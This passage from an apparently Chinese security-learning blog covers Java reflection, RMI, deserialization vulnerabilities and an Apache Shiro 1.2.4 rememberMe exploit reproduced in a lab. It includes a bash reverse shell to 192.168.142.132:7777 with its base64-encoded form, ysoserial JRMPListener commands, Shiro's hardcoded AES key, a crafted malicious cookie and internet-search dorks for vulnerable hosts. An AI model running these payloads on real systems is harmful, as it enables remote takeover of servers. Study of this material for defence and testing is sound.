&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 获取构造方法Integer(int):</span></span><br><span class=\"line\">        <span class=\"type\">Constructor</span> <span class=\"variable\">cons1</span> <span class=\"operator\">=</span> Integer.class.getConstructor(<span class=\"type\">int</span>.class);</span><br><span class=\"line\">        <span class=\"comment\">// 调用构造方法:</span></span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">n1</span> <span class=\"operator\">=</span> (Integer) cons1.newInstance(<span class=\"number\">123</span>);</span><br><span class=\"line\">        System.out.println(n1);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 获取构造方法Integer(String)</span></span><br><span class=\"line\">        <span class=\"type\">Constructor</span> <span class=\"variable\">cons2</span> <span class=\"operator\">=</span> Integer.class.getConstructor(String.class);</span><br><span class=\"line\">        <span class=\"type\">Integer</span> <span class=\"variable\">n2</span> <span class=\"operator\">=</span> (Integer) cons2.newInstance(<span class=\"string\">&quot;456&quot;</span>);</span><br><span class=\"line\">        System.out.println(n2);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>调用非 <code>public</code>  的 <code>Constructor</code>  时，必须首先通过 <code>setAccessible(true)</code>  设置允许访问。 <code>setAccessible(true)</code>  可能会失败。</p>\n<p>我们常用的另一种执行命令的方式 ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start () 来执行命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class=\"line\">((ProcessBuilder) clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;calc.exe&quot;))).start();</span><br></pre></td></tr></table></figure>\n<p>不用强制类型转换时</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class=\"line\">clazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(  Arrays.asList(&quot;calc.exe&quot;)));</span><br></pre></td></tr></table></figure>\n<p>反射可以提供动态特性</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void execute(String className, String methodName) throws Exception &#123;</span><br><span class=\"line\">Class clazz = Class.forName(className);</span><br><span class=\"line\">clazz.getMethod(methodName).invoke(clazz.newInstance());  \t&#125;</span><br></pre></td></tr></table></figure>\n<p><code>import java.lang.Runtime;</code>  该类可以用于执行任意命令</p>\n<p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用 forName 就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。</p>\n<h3 id=\"rmi\"><a class=\"markdownIt-Anchor\" href=\"#rmi\">#</a> RMI</h3>\n<p>RMI 是 Remote Method Invocation 的缩写。</p>\n<p>要实现 RMI，服务器和客户端必须共享同一个接口。我们定义一个 <code>WorldClock</code>  接口，代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public interface WorldClock extends Remote &#123;</span><br><span class=\"line\">    LocalDateTime getLocalDateTime(String zoneId) throws RemoteException;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Java 的 RMI 规定此接口必须派生自 <code>java.rmi.Remote</code> ，并在每个方法声明抛出 <code>RemoteException</code> 。</p>\n<p>下一步是编写服务器的实现类，因为客户端请求的调用方法 <code>getLocalDateTime()</code>  最终会通过这个实现类返回结果。实现类 <code>WorldClockService</code>  代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class WorldClockService implements WorldClock &#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public LocalDateTime getLocalDateTime(String zoneId) throws RemoteException &#123;</span><br><span class=\"line\">        return LocalDateTime.now(ZoneId.of(zoneId)).withNano(0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们需要通过 Java RMI 提供的一系列底层支持接口，把上面编写的服务以 RMI 的形式暴露在网络上，客户端才能调用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Server &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws RemoteException &#123;</span><br><span class=\"line\">        System.out.println(&quot;create World clock remote service...&quot;);</span><br><span class=\"line\">        // 实例化一个WorldClock:</span><br><span class=\"line\">        WorldClock worldClock = new WorldClockService();</span><br><span class=\"line\">        // 将此服务转换为远程服务接口:</span><br><span class=\"line\">        WorldClock skeleton = (WorldClock) UnicastRemoteObject.exportObject(worldClock, 0);</span><br><span class=\"line\">        // 将RMI服务注册到1099端口:</span><br><span class=\"line\">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class=\"line\">        // 注册此服务，服务名为&quot;WorldClock&quot;:</span><br><span class=\"line\">        registry.rebind(&quot;WorldClock&quot;, skeleton);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上述代码主要目的是通过 RMI 提供的相关类，将我们自己的 <code>WorldClock</code>  实例注册到 RMI 服务上。RMI 的默认端口是 <code>1099</code> ，最后一步注册服务时通过 <code>rebind()</code>  指定服务名称为 <code>&quot;WorldClock&quot;</code> 。</p>\n<p>下一步我们就可以编写客户端代码。RMI 要求服务器和客户端共享同一个接口，因此我们要把 <code>WorldClock.java</code>  这个接口文件复制到客户端，然后在客户端实现 RMI 调用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Client &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws RemoteException, NotBoundException &#123;</span><br><span class=\"line\">        // 连接到服务器localhost，端口1099:</span><br><span class=\"line\">        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);</span><br><span class=\"line\">        // 查找名称为&quot;WorldClock&quot;的服务并强制转型为WorldClock接口:</span><br><span class=\"line\">        WorldClock worldClock = (WorldClock) registry.lookup(&quot;WorldClock&quot;);</span><br><span class=\"line\">        // 正常调用接口方法:</span><br><span class=\"line\">        LocalDateTime now = worldClock.getLocalDateTime(&quot;Asia/Shanghai&quot;);</span><br><span class=\"line\">        // 打印调用结果:</span><br><span class=\"line\">        System.out.println(now);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Java 的 RMI 严重依赖序列化和反序列化，而这种情况下可能会造成严重的安全漏洞，因为 Java 的序列化和反序列化不但涉及到数据，还涉及到二进制的字节码，即使使用白名单机制也很难保证 100% 排除恶意构造的字节码。</p>\n<p>这就是完整的通信过程，我们可以发现，整个过程进行了两次 TCP 握手，也就是我们实际建立了两次<br>\n TCP 连接。<br>\n第一次建立 TCP 连接是连接远端 192.168.135.142 的 1099 端口，这也是我们在代码里看到的端口，二 者进行沟通后，我向远端发送了一个 “Call” 消息，远端回复了一个 “ReturnData” 消息，然后我新建了一 个 TCP 连接，连到远端的 33769 端口。</p>\n<p>细细阅读数据包我们会发现，在 “ReturnData” 这个包中，返回了目标的 IP 地址 192.168.135.142 ，其 后跟的一个字节 \\x00\\x00\\x83\\xE9 ，刚好就是整数 33769 的网络序列：</p>\n<p>首先客户端连接 Registry，并在其中寻找 Name 是 Hello 的对象，这个对应数据 流中的 Call 消息；然后 Registry 返回一个序列化的数据，这个就是找到的 Name=Hello 的对象，这个对应 数据流中的 ReturnData 消息；客户端反序列化该对象，发现该对象是一个远程对象，地址<br>\n在 192.168.135.142:33769 ，于是再与这个地址建立 TCP 连接；在这个新的连接中，才执行真正远程 方法调用，也就是 hello () 。</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117161651171.png\" alt=\"image-20221117161651171\" style=\"zoom:80%;\" />\n<p>RMI Registry 就像一个网关，他自己是不会执行远程方法的，但 RMI Server 可以在上面注册一个 Name  到对象的绑定关系；RMI Client 通过 Name 向 RMI Registry 查询，得到这个绑定关系，然后再连接 RMI  Server；最后，远程方法实际上在 RMI Server 上调用。</p>\n<h3 id=\"攻击rmi-registry\"><a class=\"markdownIt-Anchor\" href=\"#攻击rmi-registry\">#</a> 攻击 RMI registry</h3>\n<p>当我们可以访问目标 RMI Registry 的时候</p>\n<p>RMI Registry 是一个远程对象管理的地方，可以理解为一个远程对象的 “后台”。我们可以尝试直 接访问 “后台” 功能，比如修改远程服务器上 Hello 对应的对象：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RemoteHelloWorld h = new RemoteHelloWorld();</span><br><span class=\"line\">Naming.rebind(&quot;rmi://192.168.135.142:1099/Hello&quot;, h);</span><br></pre></td></tr></table></figure>\n<p>Java 对远程访问 RMI Registry 做了限制，只有来源地址是 localhost 的时候，才能调用 rebind、  bind、unbind 等方法。</p>\n<p>codebase 是一个地址，告诉 Java 虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的  CLASSPATH，但 CLASSPATH 是本地路径，而 codebase 通常是远程 URL，比如 http、ftp 等。<br>\n如果我们指定 codebase=http://example.com/ ，然后加载 org.vulhub.example.Example 类，则 Java 虚拟机会下载这个文件 <a href=\"http://example.com/org/vulhub/example/Example.class\">http://example.com/org/vulhub/example/Example.class</a> ，并作为 Example 类的字节码。</p>\n<p>RMI 的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻 找类。如果某一端反序列化时发现一个对象，那么就会去自己的 CLASSPATH 下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载 codebase 中的类。</p>\n<p>在 RMI 中，我们是可以将 codebase 随着序列化数据一起传输的，服务器在接收到这个数据后就会去<br>\n CLASSPATH 和指定的 codebase 寻找类，由于 codebase 被控制导致任意命令执行漏洞。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117164157276.png\" alt=\"image-20221117164157276\"></p>\n<p>所以只有满足如下条件的 RMI 服务器才能被攻击： 安装并配置了 SecurityManager</p>\n<p>Java 版本低于 7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false</p>\n<p>我们只需要编译一个恶意类，将其 class 文件放置在 Web 服务器的 / RMIClient$Payload.class 即可。</p>\n<p>我们使用 SerializationDumper 查看这段序列化数据：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117170707850.png\" alt=\"image-20221117170707850\"></p>\n<p>可见，我们的 codebase 是通过 [Ljava.rmi.server.ObjID; 的 classAnnotations 传递的。<br>\n所以，即使我们没有 RMI 的客户端，只需要修改 classAnnotations 的值，就能控制 codebase，使其 指向攻击者的恶意网站。</p>\n<p>在序列化 Java 类的时候用到了一个类，叫 ObjectOutputStream 。这个类内部有一个方法  annotateClass ， ObjectOutputStream 的子类有需要向序列化后的数据里放任何内容，都可以重写 这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。</p>\n<p>我们在分析序列化数据时看到的 classAnnotations ，实际上就是 annotateClass 方法写入的内容。</p>\n<p>Java 在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是  ObjectOutputStream ，开发者可以将任何内容写入这个 stream 中；反序列化时，会调用  readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。</p>\n<p>我们写入的字符串被放在 objectAnnotation 的位置。在反序列化时，我读取了这个字符串，并将其输出：，是在 writeobject 写入</p>\n<p>ysoserial 可以让用户根据自己选择的利用链，生成反 序列化利用数据，通过将这些数据发送给目标，从而执行用户预先定义的命令。</p>\n<p>利用链也叫 “gadget chains”，我们通常称为 gadget。如果你学过 PHP 反序列化漏洞，那么就可以将  gadget 理解为一种方法，它连接的是从触发位置开始到执行命令的位置结束</p>\n<p>ysoserial 大部分的 gadget 的参数就是一条命令，比如这里是 id 。生成好的 POC 发送给目标，如 果目标存在反序列化漏洞，并满足这个 gadget 对应的条件，则命令 id 将被执行</p>\n<p>用 ysoserial 可以很容 易地生成这个 gadget 对应的 POC：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"序列化和反序列化\"><a class=\"markdownIt-Anchor\" href=\"#序列化和反序列化\">#</a> 序列化和反序列化</h3>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120161615273.png\" alt=\"image-20221120161615273\" style=\"zoom:67%;\" />\n<p>主要应用场景：</p>\n<p>1、持久化内存数据</p>\n<p>2、网络传输对象</p>\n<p>3、远程方法调用 (RMI)</p>\n<p>java 可以序列化成字节流，也可以序列化为 json 格式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestToFile</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">        Person obj= <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;wuya&quot;</span>, <span class=\"number\">666</span>);</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">filePath</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;D:/wuya.xxx&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 序列化</span></span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span>  <span class=\"variable\">outStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(filePath));</span><br><span class=\"line\">        outStream.writeObject(obj);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 反序列化</span></span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span>  <span class=\"variable\">inStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(filePath));</span><br><span class=\"line\">        <span class=\"comment\">// readObject 方法</span></span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">readObject</span> <span class=\"operator\">=</span> (Person)inStream.readObject();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;反序列化后：name=&quot;</span>+readObject.name +<span class=\"string\">&quot;,age=&quot;</span>+readObject.age);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120163923386.png\" alt=\"image-20221120163923386\"></p>\n<p>很明显，序列化后的字节流的开头为 aced</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzgvZG9jcy9wbGF0Zm9ybS9zZXJpYWxpemF0aW9uL3NwZWMvc2VyaWFsVE9DLmh0bWw=\">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzgvZG9jcy9wbGF0Zm9ybS9zZXJpYWxpemF0aW9uL3NwZWMvcHJvdG9jb2wuaHRtbCNhMTAyNTg=\">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html#a10258</span></p>\n<p>详细格式如上</p>\n<p>如果两个包不在一个路径下，需要引入依赖</p>\n<blockquote>\n<p>序列化</p>\n<p>java.io.ObjectOutputStream.writeObject()</p>\n<p>反序列化</p>\n<p>java.io.ObjectInputStream.readObject()</p>\n</blockquote>\n<p>如果在序列化的时候 override 了 readobject，那么在反序列化的时候就不会再执行 OOI 的代码</p>\n<p>如果此时重写的代码中含有可控参数，那么会造成漏洞</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.Serializable;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">UnsafeClass</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> String name;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//重写readObject()方法</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">readObject</span><span class=\"params\">(java.io.ObjectInputStream in)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">        <span class=\"comment\">//执行默认的readObject()方法</span></span><br><span class=\"line\">        in.defaultReadObject();</span><br><span class=\"line\">        <span class=\"comment\">//执行命令</span></span><br><span class=\"line\">        Runtime.getRuntime().exec(<span class=\"string\">&quot;calc.exe&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">UnsafeTest</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String args[])</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">UnsafeClass</span> <span class=\"variable\">Unsafe</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UnsafeClass</span>();</span><br><span class=\"line\">        Unsafe.name = <span class=\"string\">&quot;hacked by wuya&quot;</span>;</span><br><span class=\"line\">        <span class=\"comment\">// 序列化</span></span><br><span class=\"line\">        <span class=\"type\">FileOutputStream</span> <span class=\"variable\">fos</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;D:/wuya.yyy&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">os</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(fos);</span><br><span class=\"line\">        os.writeObject(Unsafe);</span><br><span class=\"line\">        os.close();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//从 反序列化</span></span><br><span class=\"line\">        <span class=\"type\">FileInputStream</span> <span class=\"variable\">fis</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;D:/wuya.yyy&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">ois</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(fis);</span><br><span class=\"line\">        <span class=\"type\">UnsafeClass</span> <span class=\"variable\">objectFromDisk</span> <span class=\"operator\">=</span> (UnsafeClass) ois.readObject();</span><br><span class=\"line\">        System.out.println(objectFromDisk.name);</span><br><span class=\"line\">        ois.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>那么我们要利用这个漏洞，就需要找到一些重写了 readobject 的类，同时 readobject 类中可以接受参数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package sun.reflect.annotation;</span><br><span class=\"line\">AnnotationInvocationHandler</span><br><span class=\"line\"></span><br><span class=\"line\">package javax.management;</span><br><span class=\"line\">BadAttributeValueExpException</span><br></pre></td></tr></table></figure>\n<h3 id=\"shiro-124反序列化\"><a class=\"markdownIt-Anchor\" href=\"#shiro-124反序列化\">#</a> Shiro 1.2.4 反序列化</h3>\n<p>Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro 框架直观、易用，同时也能提供健壮的安全性。</p>\n<ol>\n<li>rememberMe 生成过程：序列化→AES 加密→Base64 编码→生成 rememberMe 内容。</li>\n<li>服务端接收 Cookie 值时：检索 Cookie 中的 rememberMe 内容→Base64 解密→AES 解密 (加密密钥硬编码)→反序列化 (未做处理)。</li>\n</ol>\n<p>Apache Shiro 默认使用了 CookieRememberMeManager，其处理 Cookie 的流程：得到 rememberMe 的 Cookie 值→Base64 解码→AES 解密→反序列化。然而 AES 的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的 RCE 漏洞。</p>\n<p>关键因素：AES 的加密密钥在 Shiro 的 1.2.4 之前版本中使用的是硬编码：kPH+bIxk5D2deZiIxcaaaA==，只要找到密钥后就可以通过构造恶意的序列化对象进行编码，加密，然后作为 Cookie 加密发送，服务端接收后会解密并触发反序列化漏洞。在 1.2.4 之后，ASE 秘钥就不为默认了，需要获取到 Key 才可以进行渗透</p>\n<p>在不选择 remember-me 的时候该字段为 delete me，勾选后为刚刚加密的数据</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NoaXJvL0NWRS0yMDE2LTQ0Mzcv\">Vulhub - Docker-Compose file for vulnerability environment</span></p>\n<p>登录过程</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122183841649.png\" alt=\"image-20221122183841649\"></p>\n<p>验证过程</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122183907917.png\" alt=\"image-20221122183907917\"></p>\n<p>JRMP 全称为 Java Remote Method Protocol，也就是 Java 远程方法协议</p>\n<p>利用方式 1</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122190553667.png\" alt=\"image-20221122190553667\"></p>\n<p>利用方式 2</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122190635789.png\" alt=\"image-20221122190635789\"></p>\n<p>漏洞特征</p>\n<p>set-cookie 是否存在 remeberMe=deleteMe</p>\n<p>fofa dork</p>\n<p>header= “rememberme=deleteMe” 、header= “shiroCookie”</p>\n<p>检测工具</p>\n<p>1、shiro_tool.jar 纯字符版</p>\n<p>2、ShiroExploitV2.51</p>\n<p>3、shiro_attack-v2.0.jar</p>\n<p>硬编码的 aeskey</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122193315250.png\" alt=\"image-20221122193315250\"></p>\n<p>复现：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122193640835.png\" alt=\"image-20221122193640835\"></p>\n<p>1. 攻击机监听 nc -lvvp 7777</p>\n<p>2. 生成 payload，并编码</p>\n<p>bash -i &gt;&amp; /dev/tcp/192.168.142.132/7777 0&gt;&amp;1</p>\n<p>工具：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmVzLXguY29tL3Rvb2xzL3J1bnRpbWUtZXhlYy8=\">https://ares-x.com/tools/runtime-exec/</span></p>\n<p>结果：</p>\n<p bash,-i=\"\">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIvNzc3NyAwPiYx}|{base64,-d}|</p>\n<p>3. 攻击机连接 JRMP</p>\n<p>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}”</p>\n<p>4. 生成 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 shiro.py 192.168.142.132:8888</span><br><span class=\"line\">结果：</span><br><span class=\"line\">rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w==</span><br></pre></td></tr></table></figure>\n<p>5. 发送 payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /doLogin HTTP/1.1</span><br><span class=\"line\">Host: 192.168.142.128:8080</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class=\"line\">Accept: 